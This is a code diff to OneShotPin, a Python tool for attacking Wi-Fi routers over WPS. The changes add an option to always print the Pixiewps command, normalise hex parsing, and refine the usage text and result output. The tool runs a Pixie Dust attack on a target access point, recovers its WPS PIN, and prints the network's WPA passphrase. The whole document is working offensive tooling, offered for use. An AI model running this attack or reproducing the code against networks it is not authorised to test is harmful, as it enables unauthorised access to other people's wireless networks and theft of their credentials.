@@ -36,6 +36,7 @@ class Options():
         self.pin = None
         self.essid = None
         self.pixiemode = False
+        self.showpixiecmd = True
         self.verbose = False
 
 
@@ -93,7 +94,7 @@ def statechange(data, old, new):
 
 def get_hex(line):
     a = line.split(':', 3)
-    return a[2].replace(' ', '')
+    return a[2].replace(' ', '').upper()
 
 
 def process_wpa_supplicant(pipe, options, data):
@@ -243,20 +244,23 @@ def die(msg):
 
 def usage():
     die("""
-OneShotPin
+OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg
+
+{} <arguments>
 
 Required Arguments:
-    -i, --interface=<wlan0>  Name of the interface to use
-    -b, --bssid=<mac>        BSSID of the target AP
+    -i, --interface=<wlan0>  : Name of the interface to use
+    -b, --bssid=<mac>        : BSSID of the target AP
 
 Optional Arguments:
-    -p, --pin=<wps pin>      Use the specified pin (arbitrary string or 4/8 digit pin)
-    -K, --pixie-dust         Run pixiedust attack
-    -v                       Verbose output
+    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
+    -K, --pixie-dust         : Run Pixie Dust attack
+    -X                       : Alway print Pixiewps command
+    -v                       : Verbose output
 
 Example:
     {} -i wlan0 -b 00:90:4C:C1:AC:21 -K
-""".format(sys.argv[0]))
+""".format(sys.argv[0], sys.argv[0]))
 
 
 def cleanup(wpas, options):
@@ -269,19 +273,20 @@ if __name__ == '__main__':
     options = Options()
 
     import getopt
-    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:Kv", ["help", "interface", "bssid", "pin", "pixie-dust"])
+    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XKv", ["help", "interface", "bssid", "pin", "pixie-dust"])
     for a, b in optlist:
         if a in ('-i', "--interface"): options.interface = b
         elif a in ('-b', "--bssid"): options.bssid = b.upper()
         elif a in ('-p', "--pin"): options.pin = b
         elif a in ('-K', "--pixie-dust"): options.pixiemode = True
+        elif a in ('-X'): options.showpixiecmd = True
         elif a in ('-v'): options.verbose = True
         elif a == '--help': usage()
     if not options.interface or not options.bssid:
         die("Missing required argument! (use --help for usage)")
     if options.pin is None:
         if not options.pixiemode:
-            die("You need to supply a pin or enable pixiemode! (use --help for usage)")
+            die("You need to supply a pin or enable pixiemode (-K)! (use --help for usage)")
         else:
             options.pin = '12345670'
 
@@ -293,15 +298,15 @@ if __name__ == '__main__':
     connect(options, data)
 
     if data.wpa_psk:
-        print("[+] WPS PIN: {}".format(options.pin))
-        print("[+] WPA PSK: {}".format(data.wpa_psk))
-        print("[+] AP SSID: {}".format(options.essid))
+        print("[+] WPS PIN: '{}'".format(options.pin))
+        print("[+] WPA PSK: '{}'".format(data.wpa_psk))
+        print("[+] AP SSID: '{}'".format(options.essid))
         sys.exit(0)
 
     elif data.got_all() and options.pixiemode:
         pixiecmd = data.get_pixie_cmd()
         print("Running Pixiewps...")
-        if options.verbose: print("Cmd: {}".format(pixiecmd))
+        if options.verbose or options.showpixiecmd: print("Cmd: {}".format(pixiecmd))
         out = shellcmd(pixiecmd)
         print(out)
         a = parse_pixiewps(out)
@@ -309,15 +314,18 @@ if __name__ == '__main__':
             options.pin = a
             options.pixiemode = False
             data.clear()
-            print('[*] Trying to get WPA PSK with the correct PIN...'.format(options.pin))
+            print('[+] Trying to get WPA PSK with the correct PIN...'.format(options.pin))
 
             connect(options, data)
 
             if data.wpa_psk:
-                print("[+] WPS PIN: {}".format(options.pin))
-                print("[+] WPA PSK: {}".format(data.wpa_psk))
-                print("[+] AP SSID: {}".format(options.essid))
+                print("[+] WPS PIN: '{}'".format(options.pin))
+                print("[+] WPA PSK: '{}'".format(data.wpa_psk))
+                print("[+] AP SSID: '{}'".format(options.essid))
                 sys.exit(0)
             sys.exit(1)
+    elif options.pixiemode:
+        print('[!] No enough data to run Pixie Dust attack')
+        sys.exit(1)
 
     sys.exit(1)
